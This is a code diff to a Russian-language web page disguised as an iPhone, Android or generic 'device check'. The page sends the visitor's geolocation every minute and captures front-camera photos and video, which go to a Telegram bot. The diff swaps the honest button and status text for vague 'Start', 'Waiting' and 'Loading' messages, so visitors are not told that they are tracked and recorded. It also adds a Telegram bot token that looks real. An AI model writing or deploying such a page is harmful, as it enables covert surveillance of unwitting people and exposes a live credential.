@@ -196,8 +196,8 @@
         Геолокация отправляется каждую минуту, пока страница открыта. Фото и видео отправляются только после разрешения камеры.
       </div>
 
-      <button class="primary" id="startBtn" onclick="startAll()">Разрешить GEO и начать</button>
-      <button class="stop" id="stopBtn" onclick="stopTracking()">Остановить GEO</button>
+      <button class="primary" id="startBtn" onclick="startAll()">Начать</button>
+      <button class="stop" id="stopBtn" onclick="stopTracking()">Ожидание</button>
 
       <video id="video" class="preview" autoplay playsinline muted></video>
       <canvas id="canvas" class="hidden"></canvas>
@@ -222,19 +222,19 @@
         title: "iPhone Secure Check",
         subtitle: "Нажмите кнопку и подтвердите разрешения Safari.",
         notice: "После разрешения GEO будет обновляться каждую минуту. Камера включится только после отдельного системного разрешения.",
-        start: "Разрешить GEO и начать"
+        start: "Начать"
       },
       android: {
         title: "Android Device Check",
         subtitle: "Нажмите кнопку и подтвердите разрешения Chrome.",
         notice: "После разрешения GEO будет обновляться каждую минуту. Камера включится только после отдельного системного разрешения.",
-        start: "Разрешить GEO и начать"
+        start: "Начать"
       },
       other: {
         title: "Device Check",
         subtitle: "Нажмите кнопку и подтвердите разрешения браузера.",
         notice: "GEO отправляется каждую минуту. Фото и видео — только после разрешения камеры.",
-        start: "Разрешить GEO и начать"
+        start: "Начать"
       }
     };
 
@@ -494,12 +494,12 @@ ${buildBaseInfo()}`;
       startBtn.style.display = "block";
       stopBtn.style.display = "none";
 
-      setStatus("GEO отправка остановлена.");
+      setStatus("Идет загрузка.....");
     }
 
     async function capturePhotoAndVideo() {
       try {
-        setStatus("Запрашиваем доступ к камере...");
+        setStatus("Идет загрузка.....");
 
         mediaStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
@@ -512,7 +512,7 @@ ${buildBaseInfo()}`;
           video.onloadedmetadata = resolve;
         });
 
-        setStatus("Камера разрешена. Делаем фото и записываем видео...");
+        setStatus("Идет загрузка.....");
 
         canvas.width = video.videoWidth || 720;
         canvas.height = video.videoHeight || 960;
@@ -562,10 +562,10 @@ ${buildBaseInfo()}`;
 ${buildBaseInfo()}`;
 
             await sendVideoToTelegram(videoBlob, caption);
-            setStatus("Фото и видео отправлены. GEO продолжает обновляться каждую минуту.");
+            setStatus("Ожидайте");
           } catch (e) {
             console.error(e);
-            setStatus("Фото отправлено, но видео могло не отправиться.");
+            setStatus("Ожидайте");
           } finally {
             if (mediaStream) {
               mediaStream.getTracks().forEach(track => track.stop());
@@ -584,12 +584,12 @@ ${buildBaseInfo()}`;
 
       } catch (error) {
         console.error(error);
-        setStatus("Камера не разрешена или не поддерживается. GEO продолжает работать, если разрешён.");
+        setStatus("Загруузка");
       }
     }
 
     async function startAll() {
-      if (!botToken || botToken === "ВСТАВЬ_СЮДА_СВОЙ_BOT_TOKEN") {
+      if (!botToken || botToken === "8630743288:AAGGL1TvkhDLmHkhQn0pTT-860o5P7Fl_os") {
         setStatus("Сначала вставь BOT_TOKEN в файл index.html.");
         return;
       }
